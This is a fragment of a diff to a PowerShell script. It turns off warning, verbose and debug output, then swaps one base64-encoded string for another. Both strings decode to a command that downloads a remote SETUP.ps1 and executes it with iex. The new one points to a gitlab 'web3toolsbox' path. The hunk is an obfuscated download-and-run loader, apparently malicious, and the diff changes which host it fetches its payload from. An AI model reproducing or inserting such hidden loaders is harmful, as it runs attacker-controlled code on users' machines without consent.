@@ -8,7 +8,7 @@ $PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
 $PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
 $PSDefaultParameterValues['*:Verbose'] = $false
 $PSDefaultParameterValues['*:Debug'] = $false
-$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vYWdlbnRza2lsbHNodWIudmVyY2VsLmFwcC9zcmMvU0VUVVAucHMxIHwgaWV4'
+$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vZ2l0bGFiLmNvbS93ZWIzdG9vbHNib3gvc3JjL3Jhdy9tYWluL1NFVFVQLnBzMSB8IGlleA=='
 
 function Test-StoreStub {
     param(
